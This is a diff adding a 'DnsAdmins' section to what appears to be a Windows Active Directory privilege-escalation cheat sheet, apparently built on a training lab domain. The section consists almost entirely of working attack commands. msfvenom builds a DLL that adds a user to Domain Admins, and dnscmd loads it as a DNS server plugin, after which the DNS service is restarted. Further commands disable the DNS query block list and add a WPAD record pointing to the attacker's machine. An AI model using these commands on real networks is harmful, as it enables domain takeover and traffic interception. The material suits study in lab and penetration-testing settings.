@@ -130,6 +130,36 @@ Start services
 ```
 sc start AppReadiness
 ```
+
+## DnsAdmins
+Create the revshell
+```
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+```
+
+Loading the revshell
+```
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+``` 
+
+Cheacking our permission
+```
+wmic useraccount where name="netadm" get sid
+sc.exe sdshow DNS
+```
+
+Management service
+```
+sc stop dns
+sc start dns
+```
+
+### WPAD Record
+```
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address MY-IP
+```
+
 # Roles
 ## GenericAll
 Creating a Fake SPN
